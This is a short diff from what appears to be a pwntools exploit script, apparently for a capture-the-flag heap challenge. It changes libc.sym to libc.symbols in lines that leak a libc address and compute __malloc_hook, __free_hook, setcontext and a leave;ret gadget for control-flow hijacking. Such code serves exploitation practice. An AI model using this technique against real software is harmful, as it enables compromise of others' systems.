@@ -52,11 +52,11 @@ libc_addr=u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
 print("libc_addr: ",hex(libc_addr))
 malloc_hook=libc_addr-0x70
 print("malloc_hook: ",hex(malloc_hook))
-libc_base=malloc_hook-libc.sym['__malloc_hook']
+libc_base=malloc_hook-libc.symbols['__malloc_hook']
 print("libc_base: ",hex(libc_base))
 setcontext=malloc_hook-0x399be0
 print("setcontext: ",hex(setcontext))
-free_hook=libc_base+libc.sym['__free_hook']
+free_hook=libc_base+libc.symbols['__free_hook']
 print("free_hook: ",hex(free_hook))
 
 leave_ret=libc_base+0x00000000000547e3
